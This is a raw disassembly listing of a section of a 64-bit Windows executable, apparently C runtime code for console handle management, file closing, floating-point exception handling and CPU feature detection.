   14000d9b2:	c5 fb 10 0d 46 74 00 	vmovsd 0x7446(%rip),%xmm1        # 0x140014e00
   14000d9b9:	00 
   14000d9ba:	44 8b 05 7f 76 00 00 	mov    0x767f(%rip),%r8d        # 0x140015040
   14000d9c1:	e8 5a 06 00 00       	call   0x14000e020
   14000d9c6:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000d9cc:	48 83 c4 58          	add    $0x58,%rsp
   14000d9d0:	c3                   	ret
   14000d9d1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000d9d8:	0f 1f 84 00 00 00 00 
   14000d9df:	00 
   14000d9e0:	c5 fb 10 0d 38 74 00 	vmovsd 0x7438(%rip),%xmm1        # 0x140014e20
   14000d9e7:	00 
   14000d9e8:	44 8b 05 55 76 00 00 	mov    0x7655(%rip),%r8d        # 0x140015044
   14000d9ef:	e8 2c 06 00 00       	call   0x14000e020
   14000d9f4:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000d9fa:	48 83 c4 58          	add    $0x58,%rsp
   14000d9fe:	c3                   	ret
   14000d9ff:	90                   	nop
   14000da00:	48 3b 05 09 74 00 00 	cmp    0x7409(%rip),%rax        # 0x140014e10
   14000da07:	74 27                	je     0x14000da30
   14000da09:	48 3b 05 f0 73 00 00 	cmp    0x73f0(%rip),%rax        # 0x140014e00
   14000da10:	74 ce                	je     0x14000d9e0
   14000da12:	48 0b 05 17 74 00 00 	or     0x7417(%rip),%rax        # 0x140014e30
   14000da19:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000da1e:	44 8b 05 23 76 00 00 	mov    0x7623(%rip),%r8d        # 0x140015048
   14000da25:	e8 f6 05 00 00       	call   0x14000e020
   14000da2a:	eb 04                	jmp    0x14000da30
   14000da2c:	0f 1f 40 00          	nopl   0x0(%rax)
   14000da30:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000da36:	48 83 c4 58          	add    $0x58,%rsp
   14000da3a:	c3                   	ret
   14000da3b:	cc                   	int3
   14000da3c:	40 53                	rex push %rbx
   14000da3e:	48 83 ec 40          	sub    $0x40,%rsp
   14000da42:	48 8b 05 87 cf 00 00 	mov    0xcf87(%rip),%rax        # 0x14001a9d0
   14000da49:	33 db                	xor    %ebx,%ebx
   14000da4b:	48 83 f8 fe          	cmp    $0xfffffffffffffffe,%rax
   14000da4f:	75 2e                	jne    0x14000da7f
   14000da51:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000da56:	44 8d 43 03          	lea    0x3(%rbx),%r8d
   14000da5a:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000da5e:	48 8d 0d eb 75 00 00 	lea    0x75eb(%rip),%rcx        # 0x140015050
   14000da65:	45 33 c9             	xor    %r9d,%r9d
   14000da68:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000da6d:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000da72:	ff 15 b0 17 00 00    	call   *0x17b0(%rip)        # 0x14000f228
   14000da78:	48 89 05 51 cf 00 00 	mov    %rax,0xcf51(%rip)        # 0x14001a9d0
   14000da7f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000da83:	0f 95 c3             	setne  %bl
   14000da86:	8b c3                	mov    %ebx,%eax
   14000da88:	48 83 c4 40          	add    $0x40,%rsp
   14000da8c:	5b                   	pop    %rbx
   14000da8d:	c3                   	ret
   14000da8e:	cc                   	int3
   14000da8f:	cc                   	int3
   14000da90:	48 83 ec 28          	sub    $0x28,%rsp
   14000da94:	48 8b 0d 35 cf 00 00 	mov    0xcf35(%rip),%rcx        # 0x14001a9d0
   14000da9b:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000da9f:	77 06                	ja     0x14000daa7
   14000daa1:	ff 15 71 17 00 00    	call   *0x1771(%rip)        # 0x14000f218
   14000daa7:	48 83 c4 28          	add    $0x28,%rsp
   14000daab:	c3                   	ret
   14000daac:	48 8b c4             	mov    %rsp,%rax
   14000daaf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000dab3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000dab7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000dabb:	57                   	push   %rdi
   14000dabc:	48 83 ec 40          	sub    $0x40,%rsp
   14000dac0:	48 83 60 d8 00       	andq   $0x0,-0x28(%rax)
   14000dac5:	49 8b f8             	mov    %r8,%rdi
   14000dac8:	4d 8b c8             	mov    %r8,%r9
   14000dacb:	8b f2                	mov    %edx,%esi
   14000dacd:	44 8b c2             	mov    %edx,%r8d
   14000dad0:	48 8b e9             	mov    %rcx,%rbp
   14000dad3:	48 8b d1             	mov    %rcx,%rdx
   14000dad6:	48 8b 0d f3 ce 00 00 	mov    0xcef3(%rip),%rcx        # 0x14001a9d0
   14000dadd:	ff 15 b5 16 00 00    	call   *0x16b5(%rip)        # 0x14000f198
   14000dae3:	8b d8                	mov    %eax,%ebx
   14000dae5:	85 c0                	test   %eax,%eax
   14000dae7:	75 6a                	jne    0x14000db53
   14000dae9:	ff 15 e1 15 00 00    	call   *0x15e1(%rip)        # 0x14000f0d0
   14000daef:	83 f8 06             	cmp    $0x6,%eax
   14000daf2:	75 5f                	jne    0x14000db53
   14000daf4:	48 8b 0d d5 ce 00 00 	mov    0xced5(%rip),%rcx        # 0x14001a9d0
   14000dafb:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000daff:	77 06                	ja     0x14000db07
   14000db01:	ff 15 11 17 00 00    	call   *0x1711(%rip)        # 0x14000f218
   14000db07:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000db0d:	48 8d 0d 3c 75 00 00 	lea    0x753c(%rip),%rcx        # 0x140015050
   14000db14:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000db19:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000db1f:	45 33 c9             	xor    %r9d,%r9d
   14000db22:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000db27:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000db2c:	ff 15 f6 16 00 00    	call   *0x16f6(%rip)        # 0x14000f228
   14000db32:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000db38:	4c 8b cf             	mov    %rdi,%r9
   14000db3b:	48 8b c8             	mov    %rax,%rcx
   14000db3e:	48 89 05 8b ce 00 00 	mov    %rax,0xce8b(%rip)        # 0x14001a9d0
   14000db45:	44 8b c6             	mov    %esi,%r8d
   14000db48:	48 8b d5             	mov    %rbp,%rdx
   14000db4b:	ff 15 47 16 00 00    	call   *0x1647(%rip)        # 0x14000f198
   14000db51:	8b d8                	mov    %eax,%ebx
   14000db53:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000db58:	8b c3                	mov    %ebx,%eax
   14000db5a:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000db5f:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000db64:	48 83 c4 40          	add    $0x40,%rsp
   14000db68:	5f                   	pop    %rdi
   14000db69:	c3                   	ret
   14000db6a:	cc                   	int3
   14000db6b:	cc                   	int3
   14000db6c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000db71:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000db76:	57                   	push   %rdi
   14000db77:	48 83 ec 20          	sub    $0x20,%rsp
   14000db7b:	49 8b f9             	mov    %r9,%rdi
   14000db7e:	49 8b d8             	mov    %r8,%rbx
   14000db81:	8b 0a                	mov    (%rdx),%ecx
   14000db83:	e8 d0 be ff ff       	call   0x140009a58
   14000db88:	90                   	nop
   14000db89:	48 8b 03             	mov    (%rbx),%rax
   14000db8c:	48 63 08             	movslq (%rax),%rcx
   14000db8f:	48 8b d1             	mov    %rcx,%rdx
   14000db92:	48 8b c1             	mov    %rcx,%rax
   14000db95:	48 c1 f8 06          	sar    $0x6,%rax
   14000db99:	4c 8d 05 30 dc 00 00 	lea    0xdc30(%rip),%r8        # 0x14001b7d0
   14000dba0:	83 e2 3f             	and    $0x3f,%edx
   14000dba3:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000dba7:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000dbab:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   14000dbb0:	74 09                	je     0x14000dbbb
   14000dbb2:	e8 cd 00 00 00       	call   0x14000dc84
   14000dbb7:	8b d8                	mov    %eax,%ebx
   14000dbb9:	eb 0e                	jmp    0x14000dbc9
   14000dbbb:	e8 80 9b ff ff       	call   0x140007740
   14000dbc0:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000dbc6:	83 cb ff             	or     $0xffffffff,%ebx
   14000dbc9:	8b 0f                	mov    (%rdi),%ecx
   14000dbcb:	e8 b0 be ff ff       	call   0x140009a80
   14000dbd0:	8b c3                	mov    %ebx,%eax
   14000dbd2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000dbd7:	48 83 c4 20          	add    $0x20,%rsp
   14000dbdb:	5f                   	pop    %rdi
   14000dbdc:	c3                   	ret
   14000dbdd:	cc                   	int3
   14000dbde:	cc                   	int3
   14000dbdf:	cc                   	int3
   14000dbe0:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000dbe4:	48 83 ec 38          	sub    $0x38,%rsp
   14000dbe8:	48 63 d1             	movslq %ecx,%rdx
   14000dbeb:	83 fa fe             	cmp    $0xfffffffe,%edx
   14000dbee:	75 15                	jne    0x14000dc05
   14000dbf0:	e8 2b 9b ff ff       	call   0x140007720
   14000dbf5:	83 20 00             	andl   $0x0,(%rax)
   14000dbf8:	e8 43 9b ff ff       	call   0x140007740
   14000dbfd:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000dc03:	eb 74                	jmp    0x14000dc79
   14000dc05:	85 c9                	test   %ecx,%ecx
   14000dc07:	78 58                	js     0x14000dc61
   14000dc09:	3b 15 c1 df 00 00    	cmp    0xdfc1(%rip),%edx        # 0x14001bbd0
   14000dc0f:	73 50                	jae    0x14000dc61
   14000dc11:	48 8b ca             	mov    %rdx,%rcx
   14000dc14:	4c 8d 05 b5 db 00 00 	lea    0xdbb5(%rip),%r8        # 0x14001b7d0
   14000dc1b:	83 e1 3f             	and    $0x3f,%ecx
   14000dc1e:	48 8b c2             	mov    %rdx,%rax
   14000dc21:	48 c1 f8 06          	sar    $0x6,%rax
   14000dc25:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000dc29:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000dc2d:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000dc32:	74 2d                	je     0x14000dc61
   14000dc34:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000dc39:	89 54 24 50          	mov    %edx,0x50(%rsp)
   14000dc3d:	89 54 24 58          	mov    %edx,0x58(%rsp)
   14000dc41:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000dc46:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000dc4b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000dc50:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000dc55:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000dc5a:	e8 0d ff ff ff       	call   0x14000db6c
   14000dc5f:	eb 1b                	jmp    0x14000dc7c
   14000dc61:	e8 ba 9a ff ff       	call   0x140007720
   14000dc66:	83 20 00             	andl   $0x0,(%rax)
   14000dc69:	e8 d2 9a ff ff       	call   0x140007740
   14000dc6e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000dc74:	e8 a7 99 ff ff       	call   0x140007620
   14000dc79:	83 c8 ff             	or     $0xffffffff,%eax
   14000dc7c:	48 83 c4 38          	add    $0x38,%rsp
   14000dc80:	c3                   	ret
   14000dc81:	cc                   	int3
   14000dc82:	cc                   	int3
   14000dc83:	cc                   	int3
   14000dc84:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000dc89:	57                   	push   %rdi
   14000dc8a:	48 83 ec 20          	sub    $0x20,%rsp
   14000dc8e:	48 63 f9             	movslq %ecx,%rdi
   14000dc91:	8b cf                	mov    %edi,%ecx
   14000dc93:	e8 cc be ff ff       	call   0x140009b64
   14000dc98:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000dc9c:	75 04                	jne    0x14000dca2
   14000dc9e:	33 db                	xor    %ebx,%ebx
   14000dca0:	eb 5a                	jmp    0x14000dcfc
   14000dca2:	48 8b 05 27 db 00 00 	mov    0xdb27(%rip),%rax        # 0x14001b7d0
   14000dca9:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000dcae:	83 ff 01             	cmp    $0x1,%edi
   14000dcb1:	75 09                	jne    0x14000dcbc
   14000dcb3:	40 84 b8 c8 00 00 00 	test   %dil,0xc8(%rax)
   14000dcba:	75 0d                	jne    0x14000dcc9
   14000dcbc:	3b f9                	cmp    %ecx,%edi
   14000dcbe:	75 20                	jne    0x14000dce0
   14000dcc0:	f6 80 80 00 00 00 01 	testb  $0x1,0x80(%rax)
   14000dcc7:	74 17                	je     0x14000dce0
   14000dcc9:	e8 96 be ff ff       	call   0x140009b64
   14000dcce:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000dcd3:	48 8b d8             	mov    %rax,%rbx
   14000dcd6:	e8 89 be ff ff       	call   0x140009b64
   14000dcdb:	48 3b c3             	cmp    %rbx,%rax
   14000dcde:	74 be                	je     0x14000dc9e
   14000dce0:	8b cf                	mov    %edi,%ecx
   14000dce2:	e8 7d be ff ff       	call   0x140009b64
   14000dce7:	48 8b c8             	mov    %rax,%rcx
   14000dcea:	ff 15 28 15 00 00    	call   *0x1528(%rip)        # 0x14000f218
   14000dcf0:	85 c0                	test   %eax,%eax
   14000dcf2:	75 aa                	jne    0x14000dc9e
   14000dcf4:	ff 15 d6 13 00 00    	call   *0x13d6(%rip)        # 0x14000f0d0
   14000dcfa:	8b d8                	mov    %eax,%ebx
   14000dcfc:	8b cf                	mov    %edi,%ecx
   14000dcfe:	e8 a5 bd ff ff       	call   0x140009aa8
   14000dd03:	48 8b d7             	mov    %rdi,%rdx
   14000dd06:	4c 8d 05 c3 da 00 00 	lea    0xdac3(%rip),%r8        # 0x14001b7d0
   14000dd0d:	83 e2 3f             	and    $0x3f,%edx
   14000dd10:	48 8b cf             	mov    %rdi,%rcx
   14000dd13:	48 c1 f9 06          	sar    $0x6,%rcx
   14000dd17:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000dd1b:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000dd1f:	c6 44 d1 38 00       	movb   $0x0,0x38(%rcx,%rdx,8)
   14000dd24:	85 db                	test   %ebx,%ebx
   14000dd26:	74 0c                	je     0x14000dd34
   14000dd28:	8b cb                	mov    %ebx,%ecx
   14000dd2a:	e8 a1 99 ff ff       	call   0x1400076d0
   14000dd2f:	83 c8 ff             	or     $0xffffffff,%eax
   14000dd32:	eb 02                	jmp    0x14000dd36
   14000dd34:	33 c0                	xor    %eax,%eax
   14000dd36:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000dd3b:	48 83 c4 20          	add    $0x20,%rsp
   14000dd3f:	5f                   	pop    %rdi
   14000dd40:	c3                   	ret
   14000dd41:	cc                   	int3
   14000dd42:	cc                   	int3
   14000dd43:	cc                   	int3
   14000dd44:	83 49 18 ff          	orl    $0xffffffff,0x18(%rcx)
   14000dd48:	33 c0                	xor    %eax,%eax
   14000dd4a:	48 89 01             	mov    %rax,(%rcx)
   14000dd4d:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000dd51:	89 41 10             	mov    %eax,0x10(%rcx)
   14000dd54:	48 89 41 1c          	mov    %rax,0x1c(%rcx)
   14000dd58:	48 89 41 28          	mov    %rax,0x28(%rcx)
   14000dd5c:	87 41 14             	xchg   %eax,0x14(%rcx)
   14000dd5f:	c3                   	ret
   14000dd60:	48 8b c4             	mov    %rsp,%rax
   14000dd63:	53                   	push   %rbx
   14000dd64:	48 83 ec 50          	sub    $0x50,%rsp
   14000dd68:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   14000dd6f:	00 00 
   14000dd71:	8b d9                	mov    %ecx,%ebx
   14000dd73:	f2 0f 10 8c 24 88 00 	movsd  0x88(%rsp),%xmm1
   14000dd7a:	00 00 
   14000dd7c:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000dd81:	89 48 c8             	mov    %ecx,-0x38(%rax)
   14000dd84:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000dd8b:	00 
   14000dd8c:	f2 0f 11 40 e0       	movsd  %xmm0,-0x20(%rax)
   14000dd91:	f2 0f 11 48 e8       	movsd  %xmm1,-0x18(%rax)
   14000dd96:	f2 0f 11 58 d8       	movsd  %xmm3,-0x28(%rax)
   14000dd9b:	4c 89 40 d0          	mov    %r8,-0x30(%rax)
   14000dd9f:	e8 24 07 00 00       	call   0x14000e4c8
   14000dda4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000dda9:	e8 5a 7d ff ff       	call   0x140005b08
   14000ddae:	85 c0                	test   %eax,%eax
   14000ddb0:	75 07                	jne    0x14000ddb9
   14000ddb2:	8b cb                	mov    %ebx,%ecx
   14000ddb4:	e8 bf 06 00 00       	call   0x14000e478
   14000ddb9:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000ddbf:	48 83 c4 50          	add    $0x50,%rsp
   14000ddc3:	5b                   	pop    %rbx
   14000ddc4:	c3                   	ret
   14000ddc5:	cc                   	int3
   14000ddc6:	cc                   	int3
   14000ddc7:	cc                   	int3
   14000ddc8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ddcd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000ddd2:	57                   	push   %rdi
   14000ddd3:	48 83 ec 20          	sub    $0x20,%rsp
   14000ddd7:	8b d9                	mov    %ecx,%ebx
   14000ddd9:	48 8b f2             	mov    %rdx,%rsi
   14000dddc:	83 e3 1f             	and    $0x1f,%ebx
   14000dddf:	8b f9                	mov    %ecx,%edi
   14000dde1:	f6 c1 08             	test   $0x8,%cl
   14000dde4:	74 14                	je     0x14000ddfa
   14000dde6:	40 84 f6             	test   %sil,%sil
   14000dde9:	79 0f                	jns    0x14000ddfa
   14000ddeb:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000ddf0:	e8 4f 07 00 00       	call   0x14000e544
   14000ddf5:	83 e3 f7             	and    $0xfffffff7,%ebx
   14000ddf8:	eb 57                	jmp    0x14000de51
   14000ddfa:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000ddff:	40 84 f9             	test   %dil,%cl
   14000de02:	74 11                	je     0x14000de15
   14000de04:	48 0f ba e6 09       	bt     $0x9,%rsi
   14000de09:	73 0a                	jae    0x14000de15
   14000de0b:	e8 34 07 00 00       	call   0x14000e544
   14000de10:	83 e3 fb             	and    $0xfffffffb,%ebx
   14000de13:	eb 3c                	jmp    0x14000de51
   14000de15:	40 f6 c7 01          	test   $0x1,%dil
   14000de19:	74 16                	je     0x14000de31
   14000de1b:	48 0f ba e6 0a       	bt     $0xa,%rsi
   14000de20:	73 0f                	jae    0x14000de31
   14000de22:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000de27:	e8 18 07 00 00       	call   0x14000e544
   14000de2c:	83 e3 fe             	and    $0xfffffffe,%ebx
   14000de2f:	eb 20                	jmp    0x14000de51
   14000de31:	40 f6 c7 02          	test   $0x2,%dil
   14000de35:	74 1a                	je     0x14000de51
   14000de37:	48 0f ba e6 0b       	bt     $0xb,%rsi
   14000de3c:	73 13                	jae    0x14000de51
   14000de3e:	40 f6 c7 10          	test   $0x10,%dil
   14000de42:	74 0a                	je     0x14000de4e
   14000de44:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000de49:	e8 f6 06 00 00       	call   0x14000e544
   14000de4e:	83 e3 fd             	and    $0xfffffffd,%ebx
   14000de51:	40 f6 c7 10          	test   $0x10,%dil
   14000de55:	74 14                	je     0x14000de6b
   14000de57:	48 0f ba e6 0c       	bt     $0xc,%rsi
   14000de5c:	73 0d                	jae    0x14000de6b
   14000de5e:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000de63:	e8 dc 06 00 00       	call   0x14000e544
   14000de68:	83 e3 ef             	and    $0xffffffef,%ebx
   14000de6b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000de70:	33 c0                	xor    %eax,%eax
   14000de72:	85 db                	test   %ebx,%ebx
   14000de74:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000de79:	0f 94 c0             	sete   %al
   14000de7c:	48 83 c4 20          	add    $0x20,%rsp
   14000de80:	5f                   	pop    %rdi
   14000de81:	c3                   	ret
   14000de82:	cc                   	int3
   14000de83:	cc                   	int3
   14000de84:	48 8b c4             	mov    %rsp,%rax
   14000de87:	55                   	push   %rbp
   14000de88:	53                   	push   %rbx
   14000de89:	56                   	push   %rsi
   14000de8a:	57                   	push   %rdi
   14000de8b:	41 56                	push   %r14
   14000de8d:	48 8d 68 c9          	lea    -0x37(%rax),%rbp
   14000de91:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   14000de98:	0f 29 70 c8          	movaps %xmm6,-0x38(%rax)
   14000de9c:	48 8b 05 5d c1 00 00 	mov    0xc15d(%rip),%rax        # 0x14001a000
   14000dea3:	48 33 c4             	xor    %rsp,%rax
   14000dea6:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   14000deaa:	8b f2                	mov    %edx,%esi
   14000deac:	4c 8b f1             	mov    %rcx,%r14
   14000deaf:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000deb4:	b9 80 1f 00 00       	mov    $0x1f80,%ecx
   14000deb9:	41 8b f9             	mov    %r9d,%edi
   14000debc:	49 8b d8             	mov    %r8,%rbx
   14000debf:	e8 04 06 00 00       	call   0x14000e4c8
   14000dec4:	8b 4d 5f             	mov    0x5f(%rbp),%ecx
   14000dec7:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000decc:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   14000ded1:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   14000ded7:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   14000dedc:	f2 0f 11 44 24 48    	movsd  %xmm0,0x48(%rsp)
   14000dee2:	e8 e1 fe ff ff       	call   0x14000ddc8
   14000dee7:	f2 0f 10 75 77       	movsd  0x77(%rbp),%xmm6
   14000deec:	85 c0                	test   %eax,%eax
   14000deee:	75 40                	jne    0x14000df30
   14000def0:	83 7d 7f 02          	cmpl   $0x2,0x7f(%rbp)
   14000def4:	75 11                	jne    0x14000df07
   14000def6:	8b 45 bf             	mov    -0x41(%rbp),%eax
   14000def9:	83 e0 e3             	and    $0xffffffe3,%eax
   14000defc:	f2 0f 11 75 af       	movsd  %xmm6,-0x51(%rbp)
   14000df01:	83 c8 03             	or     $0x3,%eax
   14000df04:	89 45 bf             	mov    %eax,-0x41(%rbp)
   14000df07:	44 8b 45 5f          	mov    0x5f(%rbp),%r8d
   14000df0b:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   14000df10:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000df15:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000df1a:	48 8d 45 6f          	lea    0x6f(%rbp),%rax
   14000df1e:	44 8b ce             	mov    %esi,%r9d
   14000df21:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000df26:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000df2b:	e8 10 02 00 00       	call   0x14000e140
   14000df30:	e8 ab 7b ff ff       	call   0x140005ae0
   14000df35:	84 c0                	test   %al,%al
   14000df37:	74 34                	je     0x14000df6d
   14000df39:	85 ff                	test   %edi,%edi
   14000df3b:	74 30                	je     0x14000df6d
   14000df3d:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000df42:	4d 8b c6             	mov    %r14,%r8
   14000df45:	f2 0f 10 44 24 48    	movsd  0x48(%rsp),%xmm0
   14000df4b:	8b cf                	mov    %edi,%ecx
   14000df4d:	f2 0f 10 5d 6f       	movsd  0x6f(%rbp),%xmm3
   14000df52:	8b 55 67             	mov    0x67(%rbp),%edx
   14000df55:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000df5a:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
   14000df60:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   14000df66:	e8 f5 fd ff ff       	call   0x14000dd60
   14000df6b:	eb 1c                	jmp    0x14000df89
   14000df6d:	8b cf                	mov    %edi,%ecx
   14000df6f:	e8 04 05 00 00       	call   0x14000e478
   14000df74:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000df79:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000df7e:	e8 45 05 00 00       	call   0x14000e4c8
   14000df83:	f2 0f 10 44 24 48    	movsd  0x48(%rsp),%xmm0
   14000df89:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   14000df8d:	48 33 cc             	xor    %rsp,%rcx
   14000df90:	e8 9b 51 ff ff       	call   0x140003130
   14000df95:	0f 28 b4 24 e0 00 00 	movaps 0xe0(%rsp),%xmm6
   14000df9c:	00 
   14000df9d:	48 81 c4 f0 00 00 00 	add    $0xf0,%rsp
   14000dfa4:	41 5e                	pop    %r14
   14000dfa6:	5f                   	pop    %rdi
   14000dfa7:	5e                   	pop    %rsi
   14000dfa8:	5b                   	pop    %rbx
   14000dfa9:	5d                   	pop    %rbp
   14000dfaa:	c3                   	ret
   14000dfab:	cc                   	int3
   14000dfac:	cc                   	int3
   14000dfad:	cc                   	int3
   14000dfae:	cc                   	int3
   14000dfaf:	cc                   	int3
   14000dfb0:	40 53                	rex push %rbx
   14000dfb2:	48 83 ec 10          	sub    $0x10,%rsp
   14000dfb6:	45 33 c0             	xor    %r8d,%r8d
   14000dfb9:	33 c9                	xor    %ecx,%ecx
   14000dfbb:	44 89 05 76 dc 00 00 	mov    %r8d,0xdc76(%rip)        # 0x14001bc38
   14000dfc2:	45 8d 48 01          	lea    0x1(%r8),%r9d
   14000dfc6:	41 8b c1             	mov    %r9d,%eax
   14000dfc9:	0f a2                	cpuid
   14000dfcb:	89 04 24             	mov    %eax,(%rsp)
   14000dfce:	b8 00 10 00 18       	mov    $0x18001000,%eax
   14000dfd3:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000dfd7:	23 c8                	and    %eax,%ecx
   14000dfd9:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   14000dfdd:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   14000dfe1:	3b c8                	cmp    %eax,%ecx
   14000dfe3:	75 2c                	jne    0x14000e011
   14000dfe5:	33 c9                	xor    %ecx,%ecx
   14000dfe7:	0f 01 d0             	xgetbv
   14000dfea:	48 c1 e2 20          	shl    $0x20,%rdx
   14000dfee:	48 0b d0             	or     %rax,%rdx
   14000dff1:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000dff6:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000dffb:	44 8b 05 36 dc 00 00 	mov    0xdc36(%rip),%r8d        # 0x14001bc38
   14000e002:	24 06                	and    $0x6,%al
   14000e004:	3c 06                	cmp    $0x6,%al
   14000e006:	45 0f 44 c1          	cmove  %r9d,%r8d
   14000e00a:	44 89 05 27 dc 00 00 	mov    %r8d,0xdc27(%rip)        # 0x14001bc38
   14000e011:	44 89 05 24 dc 00 00 	mov    %r8d,0xdc24(%rip)        # 0x14001bc3c
   14000e018:	33 c0                	xor    %eax,%eax
   14000e01a:	48 83 c4 10          	add    $0x10,%rsp
   14000e01e:	5b                   	pop    %rbx
   14000e01f:	c3                   	ret
   14000e020:	48 83 ec 38          	sub    $0x38,%rsp
   14000e024:	48 8d 05 65 88 00 00 	lea    0x8865(%rip),%rax        # 0x140016890
   14000e02b:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   14000e031:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000e036:	e8 05 00 00 00       	call   0x14000e040
   14000e03b:	48 83 c4 38          	add    $0x38,%rsp
   14000e03f:	c3                   	ret
   14000e040:	48 8b c4             	mov    %rsp,%rax
   14000e043:	48 83 ec 68          	sub    $0x68,%rsp
   14000e047:	0f 29 70 e8          	movaps %xmm6,-0x18(%rax)
   14000e04b:	0f 28 f1             	movaps %xmm1,%xmm6
   14000e04e:	41 8b d1             	mov    %r9d,%edx
   14000e051:	0f 28 d8             	movaps %xmm0,%xmm3
   14000e054:	41 83 e8 01          	sub    $0x1,%r8d
   14000e058:	74 2a                	je     0x14000e084
   14000e05a:	41 83 f8 01          	cmp    $0x1,%r8d
   14000e05e:	75 69                	jne    0x14000e0c9
   14000e060:	44 89 40 d8          	mov    %r8d,-0x28(%rax)
   14000e064:	0f 57 d2             	xorps  %xmm2,%xmm2
   14000e067:	f2 0f 11 50 d0       	movsd  %xmm2,-0x30(%rax)
   14000e06c:	45 8b c8             	mov    %r8d,%r9d
   14000e06f:	f2 0f 11 40 c8       	movsd  %xmm0,-0x38(%rax)
   14000e074:	c7 40 c0 21 00 00 00 	movl   $0x21,-0x40(%rax)
   14000e07b:	c7 40 b8 08 00 00 00 	movl   $0x8,-0x48(%rax)
